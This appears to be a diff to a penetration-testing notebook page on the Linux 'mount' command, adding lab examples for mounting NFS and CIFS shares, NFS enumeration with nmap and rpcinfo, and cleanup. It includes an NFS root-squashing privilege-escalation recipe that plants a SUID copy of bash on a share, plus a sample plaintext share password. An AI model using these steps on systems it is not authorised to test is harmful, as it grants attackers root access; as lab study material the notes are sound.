@@ -9,6 +9,117 @@ hideFooterPagination: true
 
 {/* Generated from Commands/mount.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## mount: choose the operation and read the result
+
+Mount or unmount a permitted NFS export.
+
+### What the result establishes
+
+Confirm the remote export, local mountpoint, selected filesystem and actual mounted options before reading data.
+
+### Prerequisites and common failures
+
+Use read-only inspection where appropriate; client restrictions, UID/GID mapping, root squashing and protocol versions affect access.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+mkdir -p /tmp/nfs
+sudo mount -t nfs TARGET_IP:/EXPORT /tmp/nfs -o nolock
+ls -la /tmp/nfs
+sudo umount /tmp/nfs
+```
+
+### Example 2: 3. Clean up
+
+Run in: **Saved lab example**.
+
+```bash
+sudo umount /tmp/nfs
+sudo umount -f /tmp/nfs    # force, if it won't release
+sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
+```
+
+Saved context: [NFS Enumeration and Exports — 3. Clean up](/enumeration/nfs-enumeration-network-file-system#3-clean-up). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: 2. Mount and browse
+
+Run in: **Saved lab example**.
+
+```bash
+mkdir /tmp/nfs
+sudo mount -t nfs <IP>:/<export> /tmp/nfs -o nolock   # mount the share locally
+sudo ls -la /tmp/nfs                                   # browse with sudo (UID issues, see below)
+sudo cat /tmp/nfs/<file>
+```
+
+Saved context: [NFS Enumeration and Exports — 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#2-mount-and-browse). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: How to spot it on a scan
+
+Run in: **Saved lab example**.
+
+```bash
+nmap -p111,2049 -sV -sC <IP>                          # detect NFS + rpc/mount info
+nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs <IP>   # list exports + contents
+rpcinfo -p <IP>                                        # what RPC services/ports are registered
+```
+
+Saved context: [NFS Enumeration and Exports — How to spot it on a scan](/enumeration/nfs-enumeration-network-file-system#how-to-spot-it-on-a-scan). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Linux
+
+Run in: **Saved lab example**.
+
+```bash
+grcic550@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
+
+The file credentialfile has to be structured like this:
+```
+
+Saved context: [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Linux
+
+Run in: **Saved lab example**.
+
+```bash
+grcic550@htb[/htb]$ sudo mkdir /mnt/Finance
+grcic550@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
+```
+
+Saved context: [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: NFS Root Squashing
+
+Run in: **Saved lab example**.
+
+```powershell
+# remote check the name of the folder
+showmount -e 10.10.10.10
+
+# create dir
+mkdir /tmp/nfsdir  
+
+# mount directory 
+mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
+cd /tmp/nfsdir
+
+# copy wanted shell 
+cp /bin/bash .  
+
+# set suid permission
+chmod +s bash
+```
+
+Saved context: [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Mount or unmount a permitted NFS export.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=mount) · [All tools](/index)
@@ -23,6 +134,13 @@ sudo mount -t nfs TARGET_IP:/EXPORT /tmp/nfs -o nolock
 ls -la /tmp/nfs
 sudo umount /tmp/nfs
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 1: Commands](/enumeration/nfs-enumeration-network-file-system#example-1-commands-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
@@ -43,6 +161,13 @@ grcic550@htb[/htb]$ sudo mkdir /mnt/Finance
 grcic550@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 6: Linux](/enumeration/nfs-enumeration-network-file-system#example-6-linux) · [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```bash
@@ -50,6 +175,13 @@ grcic550@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o cred
 
 The file credentialfile has to be structured like this:
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 5: Linux](/enumeration/nfs-enumeration-network-file-system#example-5-linux) · [Common Services: Full Module Reference — Linux](/modules/common-services/full-reference#linux)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -75,6 +207,13 @@ sudo cat /tmp/target-NFS/<folder>/file.txt
 sudo umount -f /tmp/target-NFS
 sudo umount -l /tmp/target-NFS   # if -f doesn't work
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — NFS (Port 2049)](/enumeration/footprinting-lab-methodology-cheat-sheet#nfs-port-2049) · [NFS Enumeration and Exports — Example 4: NFS (Port 2049)](/enumeration/nfs-enumeration-network-file-system#example-4-nfs-port-2049)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -103,6 +242,13 @@ lxc start mycontainer
 lxc exec mycontainer /bin/sh
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Linux Privilege Escalation: Full Checklist — LXC/LXD](/privesc/linux-privesc-checklist#lxc/lxd)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="NFS Root Squashing">
@@ -129,6 +275,13 @@ cp /bin/bash .
 chmod +s bash
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 3: NFS Root Squashing](/enumeration/nfs-enumeration-network-file-system#example-3-nfs-root-squashing) · [NFS Enumeration and Exports — Example 7: NFS Root Squashing](/enumeration/nfs-enumeration-network-file-system#example-7-nfs-root-squashing) · [Linux Privilege Escalation: Full Checklist — NFS Root Squashing](/privesc/linux-privesc-checklist#nfs-root-squashing)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="2. Mount and browse">
@@ -144,6 +297,13 @@ sudo ls -la /tmp/nfs                                   # browse with sudo (UID i
 sudo cat /tmp/nfs/<file>
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 3: 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#example-3-2-mount-and-browse) · [NFS Enumeration and Exports — 2. Mount and browse](/enumeration/nfs-enumeration-network-file-system#2-mount-and-browse)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="3. Clean up">
@@ -157,6 +317,13 @@ sudo umount /tmp/nfs
 sudo umount -f /tmp/nfs    # force, if it won't release
 sudo umount -l /tmp/nfs    # lazy unmount — use if the mount hangs
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Example 2: 3. Clean up](/enumeration/nfs-enumeration-network-file-system#example-2-3-clean-up) · [NFS Enumeration and Exports — 3. Clean up](/enumeration/nfs-enumeration-network-file-system#3-clean-up)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -176,6 +343,13 @@ sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
 sudo umount /media/bitlockermount && sudo umount /media/bitlocker
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — BitLocker-encrypted drives](/password-attacks/password-attacks-cheat-sheet#bitlocker-encrypted-drives)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Key Principles">
@@ -189,6 +363,13 @@ Context from the notebook: 8. Unmount NFS When Done.  Stale NFS mounts freeze yo
 ```text
 sudo umount -l
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Footprinting: Service-by-Service Lab Workflow — Key Principles](/enumeration/footprinting-lab-methodology-cheat-sheet#key-principles)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -204,6 +385,13 @@ Context from the notebook: First move showmount -e &lt;IP>  →  sudo mount -t n
 sudo mount -t nfs <IP>:/<export> /tmp/nfs
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [NFS Enumeration and Exports — Quick reference](/enumeration/nfs-enumeration-network-file-system#quick-reference)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="File Transfer Protocols">
@@ -218,6 +406,21 @@ Context from the notebook: NFS 2049 Unix/Linux file sharing mount -t nfs &lt;IP>
 mount -t nfs <IP>:/ ./target/
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Ports, Protocols, and Services by Purpose — File Transfer Protocols](/reference/master-protocol-service-quick-reference#file-transfer-protocols)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [NFS Enumeration and Exports](/enumeration/nfs-enumeration-network-file-system)
+
+{/* VAULT_RELATED_END */}
